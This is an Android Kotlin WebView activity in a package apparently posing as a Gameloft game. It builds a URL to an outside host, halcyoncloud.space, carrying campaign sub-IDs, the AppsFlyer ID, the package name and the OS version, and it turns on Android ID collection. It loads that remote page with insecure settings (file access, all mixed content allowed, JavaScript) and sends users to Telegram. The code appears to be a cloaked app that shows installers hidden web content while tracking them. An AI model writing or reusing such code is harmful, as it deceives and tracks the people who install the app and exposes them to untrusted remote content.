
package com.gameloft.android.ANMP.GloftDMH.black

import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.webkit.*
import android.widget.Toast
import com.appsflyer.AppsFlyerLib
import com.gameloft.android.ANMP.GloftDMH.BuildConfig
import com.gameloft.android.ANMP.GloftDMH.R
import com.gameloft.android.ANMP.GloftDMH.black.utils.CNST
import com.gameloft.android.ANMP.GloftDMH.black.utils.CNST.C1
import com.gameloft.android.ANMP.GloftDMH.black.utils.CNST.C2
import com.gameloft.android.ANMP.GloftDMH.black.utils.CNST.C3
import com.gameloft.android.ANMP.GloftDMH.black.utils.CNST.D1
import com.gameloft.android.ANMP.GloftDMH.black.utils.CNST.D2
import com.gameloft.android.ANMP.GloftDMH.black.utils.CNST.D3
import com.orhanobut.hawk.Hawk
import dagger.hilt.android.AndroidEntryPoint
import io.sentry.Sentry


@AndroidEntryPoint
class Webby : AppCompatActivity() {
    private val TAGW: String = this::class.java.simpleName
    private val FILECHOOSERRESULTCODE = 1

    // the same for Android 5.0 methods only
    var mFilePathCallback: ValueCallback<Array<Uri>>? = null
    var mCameraPhotoPath: String? = null
    lateinit var vv: WebView


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_webby)
        vv = findViewById(R.id.viewWeb)

        Toast.makeText(this, "Loading...", Toast.LENGTH_LONG).show()

        val cookieManager = CookieManager.getInstance()
        cookieManager.setAcceptCookie(true)
        cookieManager.setAcceptThirdPartyCookies(vv, true)
        webSettings()

        val activity: Activity = this

        vv.webViewClient = object : WebViewClient() {


            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                try {
                    if (URLUtil.isNetworkUrl(url)) {
                        return false
                    }
                    if (appInstalledOrNot(url)) {
                        Log.d("devx", "ffff")

                        val intent = Intent(Intent.ACTION_VIEW)
                        intent.setData(Uri.parse(url))
                        startActivity(intent)
                    } else {

                        Toast.makeText(
                            applicationContext,
                            "Application is not installed",
                            Toast.LENGTH_LONG
                        ).show()
                        startActivity(
                            Intent(
                                Intent.ACTION_VIEW,
                                Uri.parse("https://play.google.com/store/apps/details?id=org.telegram.messenger")
                            )
                        )
                    }
                    return true
                } catch (e: Exception) {
                    return false
                }
                view.loadUrl(url)

            }


            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                //Save the last visited URL
                saveUrl(url)
            }

            override fun onReceivedError(
                view: WebView,
                errorCode: Int,
                description: String,
                failingUrl: String
            ) {
                Toast.makeText(activity, description, Toast.LENGTH_SHORT).show()
            }


        }

        vv.loadUrl(getUrl())
    }


    private fun webSettings() {
        val webSettings = vv.settings
        webSettings.javaScriptEnabled = true

        webSettings.useWideViewPort = true

        webSettings.loadWithOverviewMode = true
        webSettings.allowFileAccess = true
        webSettings.domStorageEnabled = true

        webSettings.javaScriptCanOpenWindowsAutomatically = true
        webSettings.setSupportMultipleWindows(false)

        webSettings.displayZoomControls = false
        webSettings.builtInZoomControls = true
        webSettings.setSupportZoom(true)

        webSettings.pluginState = WebSettings.PluginState.ON
        webSettings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        webSettings.setAppCacheEnabled(true)

        webSettings.allowContentAccess = true
    }

    private fun getUrl(): String {

        val spoon = getSharedPreferences("SP_WEBVIEW_PREFS", MODE_PRIVATE)

        val mainid: String = Hawk.get(CNST.MAIN_ID)
        val cpOne: String? = Hawk.get(C1)
        val cpTwo: String? = Hawk.get(C2)
        val cpThree: String? = Hawk.get(C3)
        val dpOne: String? = Hawk.get(D1)
        val dpTwo: String? = Hawk.get(D2)
        val dpThree: String? = Hawk.get(D3)

        val pack = BuildConfig.APPLICATION_ID

        val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
        Sentry.captureMessage("Apps ID: $afId")
        AppsFlyerLib.getInstance().setCollectAndroidID(true)
        val one = "sub_id_1="
        val two = "sub_id_2="
        val three = "sub_id_3="
        val four = "sub_id_4="
        val five = "sub_id_5="
        val six = "sub_id_6="
        val seven = "sub_id_7="
        val eight = "sub_id_8="

        val first = "https://"
        val second = "halcyoncloud.space/6xZ2x"

        val androidVersion = android.os.Build.VERSION.RELEASE

        val resultAB = first + second
 //       val after = "$resultAB?$one$cpOne&$two$cpTwo&$three$cpThree&$four$dpOne&$five$dpTwo&$six$dpThree&$seven$pack&$eight$afId&$nine$mainid&$ten$androidVersion"
        var after = ""
        if (cpOne != null) {
//        after = "$resultAB$one$cpOne&$two$cpTwo&$three$cpThree"
            after =
               "$resultAB?$one$cpOne&$two$cpTwo&$three$cpThree&$four$pack&$five$afId&$six$mainid&$seven$androidVersion"
        } else {
            after =
                "$resultAB?$one$dpOne&$two$dpTwo&$three$dpThree&$four$pack&$five$afId&$six$mainid&$seven$androidVersion"
        }

        Log.d("TESTAG", "Test Result $after")
        return spoon.getString("SAVED_URL", after).toString()
    }


    private fun appInstalledOrNot(uri: String): Boolean {

        val pm = packageManager
        try {
            Log.d("devx", uri)

            pm.getPackageInfo("org.telegram.messenger", PackageManager.GET_ACTIVITIES)


            return true
        } catch (e: PackageManager.NameNotFoundException) {

        }
        return false
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode != FILECHOOSERRESULTCODE || mFilePathCallback == null) {
            super.onActivityResult(requestCode, resultCode, data)
            return
        }
        var results: Array<Uri>? = null

        // check that the response is a good one
        if (resultCode == RESULT_OK) {
            if (data == null || data.data == null) {
                // if there is not data, then we may have taken a photo
                results = arrayOf(Uri.parse(mCameraPhotoPath))
            } else {
                val dataString = data.dataString
                if (dataString != null) {
                    results = arrayOf(Uri.parse(dataString))
                }
            }
        }
        mFilePathCallback?.onReceiveValue(results)
        mFilePathCallback = null
    }


    private var doubleBackToExitPressedOnce = false
    override fun onBackPressed() {


        if (vv.canGoBack()) {
            if(doubleBackToExitPressedOnce){
                vv.stopLoading()
                vv.loadUrl(firstUrl)
                //Toast.makeText(applicationContext, "attemt loading $firstUrl", Toast.LENGTH_LONG).show()
            }
            this.doubleBackToExitPressedOnce = true
            vv.goBack()
            Handler(Looper.getMainLooper()).postDelayed(Runnable { doubleBackToExitPressedOnce = false }, 2000)

        } else {
            super.onBackPressed()
        }
    }
    var firstUrl = ""
    fun saveUrl(url: String?) {
        if(!url!!.contains("t.me")) {

            if(firstUrl == "") {
                firstUrl = getSharedPreferences("SP_WEBVIEW_PREFS", MODE_PRIVATE).getString(
                    "SAVED_URL",
                    url
                ).toString()

                val sp = getSharedPreferences("SP_WEBVIEW_PREFS", MODE_PRIVATE)
                val editor = sp.edit()
                editor.putString("SAVED_URL", url)
                editor.apply()
            }
        }
    }
}